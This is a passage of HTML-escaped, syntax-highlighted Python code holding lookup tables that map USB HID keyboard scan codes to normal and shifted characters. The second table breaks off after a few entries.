&lt;&#x2F;span&gt;&lt;span&gt;normalKeys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;04&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;05&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;b&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;06&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;07&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;08&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;e&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;09&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;g&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0b&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;h&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;i&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;j&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0e&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;k&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;l&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;10&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;m&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;11&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;n&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;12&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;o&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;13&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;p&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;14&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;q&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;15&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;16&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;s&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;17&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;t&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;18&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;u&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;19&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;v&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;w&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1b&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;y&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;z&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1e&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;20&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;21&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;22&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;5&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;23&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;6&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;24&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;7&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;25&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;26&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;9&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;27&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;28&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;RET&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;29&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;ESC&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;DEL&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2b&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;SPACE&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;-&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2e&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;30&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;]&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;31&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;32&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;NON&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;33&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;34&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;#39;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;35&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;GA&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;36&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;37&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;38&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;39&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;CAP&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F1&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3b&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F2&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F3&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F4&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3e&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F5&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F6&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;40&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F7&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;41&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F8&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;42&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F9&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;43&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F10&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;44&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F11&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;45&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F12&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;shiftKeys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;04&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;A&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;05&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;B&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;06&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;C&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;07&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;D&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;08&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;E&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;09&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span 